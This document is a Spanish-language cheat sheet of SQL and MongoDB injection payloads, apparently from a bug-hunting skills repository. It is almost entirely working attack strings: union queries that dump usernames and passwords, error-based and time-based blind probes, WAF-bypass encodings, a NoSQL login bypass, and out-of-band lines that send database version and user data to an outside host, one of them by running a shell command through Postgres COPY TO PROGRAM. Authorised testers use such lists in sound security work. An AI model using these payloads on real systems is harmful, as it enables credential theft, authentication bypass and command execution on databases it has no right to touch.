# SQL Injection Payloads

> Ver `skills/hunt/sqli`. Cada payload indica qué demuestra. Confirmar
> siempre el efecto (dato, error SQL, timing consistente ×3, o callback OOB).

## Detección (diferencial)

```
'           -- error de sintaxis SQL = construcción dinámica probable
' AND '1'='1   vs   ' AND '1'='2    -- boolean diferencial en respuesta
1 AND 1=1    vs   1 AND 1=2         -- contexto numérico
' OR 'x'='x
```

## Union-based (extracción visible)

```
' ORDER BY 1-- -          -- incrementar hasta error → número de columnas
' UNION SELECT NULL-- -
' UNION SELECT NULL,version(),NULL-- -                -- MySQL/Postgres
' UNION SELECT NULL,table_name,NULL FROM information_schema.tables-- -
' UNION SELECT NULL,string_agg(username||':'||password,','),NULL FROM users-- -
```

## Error-based

```
' AND extractvalue(1,concat(0x7e,version()))-- -            -- MySQL
' AND 1=CAST((SELECT version()) AS int)-- -                 -- Postgres/MSSQL
' AND updatexml(1,concat(0x7e,(SELECT user())),1)-- -       -- MySQL
```

## Time-based blind (mínimo 3 repeticiones consistentes)

```
' AND SLEEP(5)-- -                                -- MySQL
'; WAITFOR DELAY '0:0:5'--                        -- MSSQL
' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)-- -   -- Postgres
' AND 1=(SELECT 1 FROM (SELECT SLEEP(5))x)-- -    -- MySQL anidado
```

## Out-of-band (DNS exfil — ver skills/core/oob-interactions)

```
-- MySQL (Windows):  ' AND LOAD_FILE(CONCAT('\\\\',version(),'.{TOKEN}.oast.host\\a'))-- -
-- MSSQL:            '; EXEC xp_dirtree '//'+@@version+'.{TOKEN}.oast.host/a'--
-- Oracle:           ' AND UTL_HTTP.REQUEST('http://{TOKEN}.oast.host/'||user)=1-- -
-- Postgres (COPY):  '; COPY (SELECT version()) TO PROGRAM 'nslookup {TOKEN}.oast.host'-- -
```

## Filter bypass / WAF

```
'/*!50000AND*/'1'='1        -- comentario versionado MySQL
' %26%26 '1'='1             -- && url-encoded
' aNd '1'='1                -- case mixing (filtros regex débiles)
1'||'1'='1                  -- concatenación en vez de AND
'+(SELECT'1')+'             -- espacios → + / %0a / %0b / /**/
```

## Contextos sin comillas

```
1 OR 1=1-- -
1) OR (1=1-- -              -- dentro de paréntesis (WHERE id IN (?))
1 OR SLEEP(5)--
```

## NoSQL (MongoDB)

```
{"$gt": ""}                 -- en campo password → bypass de login
'||'1'=='1                  -- $where con JS
admin'&&this.password.match(/^a/)==1   -- extracción carácter a carácter (boolean)
```

## Gotchas de uso

- `ORDER BY n` cuenta columnas sin depender de comentarios — preferible cuando
  los comentarios están filtrados (`-- -`, `#`, `/*` varían por motor).
- Time-based bajo WAF: reducir el sleep (2s) y aumentar repeticiones; sleeps
  largos disparan timeouts de proxy que parecen positivos.
- Error 500 sin mensaje SQL NO es SQLi (evidence standards) — escalar hasta
  obtener señal específica del motor.
